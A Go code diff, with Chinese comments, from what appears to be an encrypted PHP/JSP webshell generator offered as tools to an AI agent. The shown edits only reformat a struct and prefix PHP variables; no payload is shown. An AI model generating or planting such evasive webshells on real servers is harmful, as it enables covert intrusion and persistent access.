@@ -27,12 +27,12 @@ var jspEncTemplate string
 // GeneratedShell 是 generate_webshell 的产物。KeyB64 是 register_session 的
 // secret 参数;KeyDigest 供审计对照（不落库明文场景使用）。
 type GeneratedShell struct {
-	Lang      string `json:"lang"`        // phpenc | jspenc(register_session 的 lang 参数）
-	Filename  string `json:"filename"`    // 建议文件名（随机化，无语义特征）
-	Content   string `json:"content"`     // 马体全文（模板渲染后，可审计）
-	KeyB64    string `json:"key_b64"`     // 会话密钥（base64 32B,register_session 的 secret)
-	KeyDigest string `json:"key_digest"`  // sha256(密钥）前 16 hex，审计对照用
-	Mode      string `json:"mode"`        // 加密模式标识（写死于马体）
+	Lang      string `json:"lang"`       // phpenc | jspenc(register_session 的 lang 参数）
+	Filename  string `json:"filename"`   // 建议文件名（随机化，无语义特征）
+	Content   string `json:"content"`    // 马体全文（模板渲染后，可审计）
+	KeyB64    string `json:"key_b64"`    // 会话密钥（base64 32B,register_session 的 secret)
+	KeyDigest string `json:"key_digest"` // sha256(密钥）前 16 hex，审计对照用
+	Mode      string `json:"mode"`       // 加密模式标识（写死于马体）
 	Note      string `json:"note,omitempty"`
 	// RegisterHint 是上传后登记会话的精确调用示例（模型常把 key 误放进
 	// password 字段，给出可直接照抄的调用形态;password 作为 secret 别名也被接受）。
@@ -109,6 +109,13 @@ func GenerateShell(lang string, obfuscate bool, note string) (*GeneratedShell, e
 		}
 		used[id] = true
 		fields[name] = id
+	}
+	if lang == "php" {
+		for _, name := range tplIdentNames {
+			if strings.HasPrefix(name, "V") {
+				fields[name] = "$" + fields[name]
+			}
+		}
 	}
 	t, err := template.New("shell").Option("missingkey=error").Parse(tpl)
 	if err != nil {
